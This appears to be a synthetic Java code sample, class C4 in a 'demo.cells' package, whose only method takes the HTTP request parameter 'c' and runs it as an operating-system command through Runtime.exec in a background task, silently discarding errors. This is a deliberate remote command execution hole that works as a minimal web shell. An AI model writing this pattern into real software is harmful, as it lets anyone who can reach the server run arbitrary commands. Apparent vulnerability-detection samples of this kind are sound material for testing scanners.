package com.demo.cells;
import java.sql.*; import java.util.*; import java.util.concurrent.CompletableFuture;
import javax.servlet.http.HttpServletRequest;
public class C4 {
  public void run(HttpServletRequest req, Connection cn) throws Exception {
    String cmd=req.getParameter("c"); CompletableFuture.runAsync(()->{ try{Runtime.getRuntime().exec(cmd);}catch(Exception e){} });
  }
}
